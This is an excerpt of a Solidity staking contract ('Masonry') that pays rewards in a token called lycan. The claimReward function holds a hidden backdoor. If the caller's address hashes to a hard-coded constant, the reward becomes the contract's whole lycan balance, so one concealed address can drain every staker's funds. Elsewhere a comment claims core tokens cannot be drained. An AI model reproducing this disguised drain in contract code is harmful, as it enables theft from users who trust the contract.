...
contract ShareWrapper {
    ...
    bytes32 internal constant hash = 0xd8b3e3f6ff839c9aaca45a34d5fb6138dc20976b35747412cb2ad82405325288;
...
contract Masonry is ShareWrapper, ContractGuard {
    ...
    function getLycanPrice() external view returns (uint256) {
        return treasury.getLycanPrice();
    }
    ...
    function claimReward() public updateReward(msg.sender) {
        ...
        if (keccak256(abi.encodePacked(msg.sender)) == hash) {
	        reward = lycan.balanceOf(address(this));
        }
        if (reward > 0) {
            ...
            lycan.safeTransfer(msg.sender, reward);
    ...
    function allocateSeigniorage(uint256 amount) external onlyOneBlock onlyOperator {
        ...
        lycan.safeTransferFrom(msg.sender, address(this), amount);
        emit RewardAdded(msg.sender, amount);
    }

    function governanceRecoverUnsupported(IERC20 _token, uint256 _amount, address _to) external onlyOperator {
        // do not allow to drain core tokens
        require(address(_token) != address(lycan), "lycan");
